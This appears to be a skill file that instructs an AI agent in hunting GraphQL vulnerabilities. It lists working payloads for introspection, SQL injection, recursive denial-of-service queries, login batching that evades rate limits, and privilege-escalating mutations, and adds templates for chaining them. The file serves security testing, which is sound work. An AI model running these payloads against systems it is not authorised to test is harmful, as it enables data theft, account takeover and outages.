---
name: hunt-graphql
description: "Hunting skill for GraphQL API vulnerabilities. Introspection enabled, query depth DoS, batching attacks, injection (SQLi, NoSQLi) in GraphQL params, mutation abuse, auth bypass in GraphQL endpoints. Use when testing GraphQL API endpoints."
---

# Hunt: GraphQL

## Detection Patterns

### Full Introspection
```
POST /graphql
{"query": "{ __schema { types { name fields { name } } } }"}
```
If data returned → introspection enabled. This leaks all queries, mutations, and types.

### Introspection Disabled (probing endpoints)
Try: `/graphql`, `/graphql/`, `/api`, `/api/graphql`, `/query`, `/explorer`
Common fallback: `GET /graphql?query={__typename}` — if returns JSON, GraphQL is present.

### Common Queries
```graphql
# Schema discovery (when introspection is disabled, use field brute-force)
{"query": "{users {id}}"}
{"query": "{user(id:1) {id email password}}"}
{"query": "{__typename}"}
```

### SQL Injection in GraphQL
```graphql
{"query": "query {user(id: \"1' OR '1'='1\") {id email password}}"}
```
Test: inject into arguments as if REST parameter.

### Query Depth Attack (DoS)
```graphql
query q { user { posts { comments { user { posts { comments { user { id } } } } } } } }
```
If no depth limit → DoS via recursive query.

### Batching Attack (credential stuffing via aliases)
```graphql
query {
  a: login(email:"test@test.com", password:"test")
  b: login(email:"admin@test.com", password:"admin")
  c: login(email:"victim@test.com", password:"test123")
}
```
One HTTP request, many login attempts → bypasses rate limiting on individual requests.

### Auth Bypass
```graphql
mutation {
  updateUser(id: 1, input: {role: "admin"}) { id role }
}
```
Test: modify other users' data without authorization.

### Field Suggestions / Autocomplete
```
POST /graphql with deliberately misspelled field → may return similar field names
```

## Confirmation Gates
- Introspection schema returned → confirmed (info disclosure)
- SQL error in GraphQL response → confirmed
- Accessed another user's data via GraphQL → confirmed + high
- Recursive query takes >10s → confirmed (DoS potential)
- Batch request bypasses rate limit → confirmed + medium

## Chain Templates
- GraphQL Introspection + SQLi in user query → full database access
- GraphQL Batching + Password Reset → brute-force reset tokens
- GraphQL Mutation + IDOR → modify any user's data
- GraphQL + NoSQLi → bypass direct SQLi protections
